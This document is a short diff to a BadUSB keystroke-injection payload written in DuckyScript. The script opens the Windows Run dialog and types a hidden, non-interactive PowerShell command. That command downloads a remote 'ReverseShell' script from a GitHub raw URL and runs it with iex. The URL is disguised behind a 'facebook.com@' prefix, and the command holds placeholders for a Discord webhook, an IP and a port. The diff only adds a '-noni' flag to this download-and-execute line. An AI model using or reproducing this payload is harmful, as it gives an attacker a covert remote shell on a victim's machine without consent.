@@ -1,5 +1,5 @@
 GUI r
 DELAY 1500
 REM Might wanna shorten some urls my guy 
-STRING powershell -W hidden -nop -c "$webhook='DISCORD_WEBHOOK';$ip='IP_ADDRESS';$p=PORT_NUMBER;(iwr 'https://facebook.com@raw.githubusercontent.com/CharlesTheGreat77/BADUSB/main/ReverseShell/shelly.txt').Content | iex"
+STRING powershell -W hidden -noni -nop -c "$webhook='DISCORD_WEBHOOK';$ip='IP_ADDRESS';$p=PORT_NUMBER;(iwr 'https://facebook.com@raw.githubusercontent.com/CharlesTheGreat77/BADUSB/main/ReverseShell/shelly.txt').Content | iex"
 ENTER
